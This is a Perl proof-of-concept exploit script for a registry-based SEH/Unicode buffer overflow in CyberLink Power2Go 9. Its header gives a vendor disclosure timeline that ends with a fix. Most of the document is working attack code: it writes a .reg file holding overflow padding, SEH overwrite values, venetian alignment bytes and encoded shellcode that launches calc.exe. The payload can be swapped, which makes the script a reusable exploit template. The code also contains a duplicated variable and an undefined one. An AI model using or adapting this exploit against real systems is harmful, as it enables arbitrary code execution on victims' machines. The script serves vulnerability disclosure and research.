#!/usr/bin/perl

######################################################################################################
# Exploit Title: CyberLink Power2Go Essential 9.0.1002.0 - Registry SEH/Unicode Buffer Overflow
# Discovery date: 11-26-2013
# Exploit Author: Mike Czumak (T_v3rn1x) -- @SecuritySift
# Vulnerable Software/Version: CyberLink Power2Go 9 Essential 9.0.1002.0
# Vendor Site: http://www.cyberlink.com/
# Tested On: Windows XP SP3
# Timeline:
# -- 11/28/13: Initial contact to vendor requesting appropriate POC to provide vuln details  
# -- 12/03/13: Received appropriate submission POC, initial vuln details provided to vendor
# -- 12/11/13: Vendor response indicating issue has been escalated to Development team
# -- 12/17/13: Vendor response indicating RD team working on fix
# -- 03/05/14: Requested status from vendor who indicated issue has been re-escalated to Development
# -- 03/07/13: Vendor response indicating someone from Development would contact for more details
# -- 03/07/14: Vendor response indicating product team working on fix, new release scheduled 3/28
# -- 03/16/14: Additional details provided to vendor as requested
# -- 04/06/14: Status update requested from vendor
# -- 04/08/14: New build released, provided for testing; confirmed fix for this issue
# Details:
# -- Power2Go uses registry keys to set various attributes including the registered username
# -- The registered username is loaded into memory for display when the "About" screen is opened
# -- These registry values can be found here: HKEY_LOCAL_MACHINE\SOFTWARE\CyberLink\Power2Go9\9.0
# -- It loads these values into memory without proper bounds checks which enables the exploit
# To Exploit:
# -- 1) Run created .reg file 2) Open Power2Go 3) Click on Power2Go Logo in the upper left corner 
# -- Once the registry has been modified, this exploit will be persistent and execute every time
# -- the application is run and the "About" screen is opened 
######################################################################################################

my $buffsize = 50000; # sets buffer size for consistent sized payload

# construct the required start and end of the reg file
my $regfilestart ="Windows Registry Editor Version 5.00\n\n";
$regfilestart = $regfilestart . "[HKEY_LOCAL_MACHINE\\SOFTWARE\\CyberLink\\Power2Go9\\9.0]\n";
$regfilestart = $regfilestart . "\"UserName\"="; # The UserName field is vulnerable

my $junk = "T_v3rn1x" . ("\x41" x 4892); # offset to next seh 
my $nseh = "\x61\x62"; # overwrite next seh with popad + nop
my $seh = "\xd0\x50"; # overwrite seh with unicode friendly pop pop ret

# unicode venetian alignment
my $venalign = "\x6e";
$venalign = $venalign . "\x53"; # push ebx; ebx is the register closest to our shellcode following the popad 
$venalign = $venalign . "\x6e"; # venetian pad/align
$venalign = $venalign . "\x58"; # pop eax; put ebx into eax and modify to jump to our shellcode (200 bytes)
$venalign = $venalign . "\x6e"; # venetian pad/align
$venalign = $venalign . "\x05\x14\x11"; # add eax,0x11001400
$venalign = $venalign . "\x6e"; # venetian pad/align 
$venalign = $venalign . "\x2d\x12\x11"; # sub eax,0x11001200
$venalign = $venalign . "\x6e"; # venetian pad/align
$venalign = $venalign . "\x50"; # push eax
$venalign = $venalign . "\x6e"; # venetian pad/align
$venalign = $venalign . "\xc3"; # ret

my $nops = "\x71" x 236; # some unicode friendly filler before the shellcode

# Calc.exe payload
# msfpayload windows/exec CMD=calc.exe R
# alpha2 unicode/uppercase
my $shell = "PPYAIAIAIAIAQATAXAZAPA3QADAZA".
"BARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA".
"58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABAB".
"AB30APB944JBKLK8U9M0M0KPS0U99UNQ8RS44KPR004K".
"22LLDKR2MD4KCBMXLOGG0JO6NQKOP1WPVLOLQQCLM2NL".
"MPGQ8OLMM197K2ZP22B7TK0RLPTK12OLM1Z04KOPBX55".
"Y0D4OZKQXP0P4KOXMHTKR8MPKQJ3ISOL19TKNTTKM18V".
"NQKONQ90FLGQ8OLMKQY7NXK0T5L4M33MKHOKSMND45JB".
"R84K0XMTKQHSBFTKLL0KTK28MLM18S4KKT4KKQXPSYOT".
"NDMTQKQK311IQJPQKOYPQHQOPZTKLRZKSVQM2JKQTMSU".
"89KPKPKP0PQX014K2O4GKOHU7KIPMMNJLJQXEVDU7MEM".
"KOHUOLKVCLLJSPKKIPT5LEGKQ7N33BRO1ZKP23KOYERC".
"QQ2LRCM0LJA";

my $sploit = $junk.$nseh.$seh.$venalign.$nops.$shell; # assemble the exploit portion of the buffer
my $fill = "\x71" x ($buffsize - length($sploit)); # fill remainder of buffer with junk
my $buffer = $sploit.$fill; # assemble the final buffer

my $regfile = $regfilestart . "hex: " . $buffer . $regfileend; # construct the reg file with hex payload to generate binary registry entry
my $regfile = $regfilestart . "\"". $buffer . "\"";

# write the exploit buffer to file
my $file = "cyberlinkp2g9_bof.reg";
open(FILE, ">$file");
print FILE $regfile;
close(FILE);
print "Exploit file [" . $file . "] created\n";
print "Buffer size: " . length($buffer) . "\n";